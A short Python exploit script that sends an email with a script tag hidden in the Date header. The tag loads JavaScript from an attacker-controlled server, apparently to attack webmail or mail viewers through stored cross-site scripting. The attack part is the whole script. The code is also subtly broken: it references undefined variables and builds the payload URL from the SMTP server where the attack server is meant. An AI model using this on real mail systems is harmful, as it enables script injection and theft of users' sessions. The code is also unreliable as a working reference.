#!/usr/bin/python3
import smtplib
import os
import sys

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

def sendMail(dest_email,from_email,smtpsrv,payload):
    msg = "From: " + from_email + "\n"
    msg += "To: " + dest_email + "\n"
    msg += "Date: " + payload + "\n"
    msg += "Subject: HELLO!\n"
    msg += "Content-type: text/html\n\n"
    msg += "HELLO HELLO"
    msg += "\r\n\r\n"

    server = smtplib.SMTP(smtpsrv)

    try:
        server.sendmail(from_email,dest_email,msg)
        print("[+] Email sent!")
    except Exception as e:
        print("[-] Failed to send email:")
        print("[*] " + str(e))

    server.quit()

# Main
def main(argv):
    if len(sys.argv) != 7:
        print("[*] Usage: " + sys.argv[0] + " <smtpsrv> <attacksrv> <attack_webport> <js_payload_file> <from_email> <dest_email>\n")
        exit(-1)

    # Variables
    smtpsrv = sys.argv[1]
    attacksrv = sys.argv[2]
    attack_webport = sys.argv[3]
    js_payload_file = sys.argv[4]
    from_email = sys.argv[5]
    dest_email = sys.argv[6]


    if not (dstemail and frmemail):
        sys.exit()

    payload = '<script src="http://' + smtpsrv + ':' + str(attack_webport) + '/' + js_payload_file + '"></script>'

    try:
        sendMail(dest_email,from_email,smtpsrv,payload)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
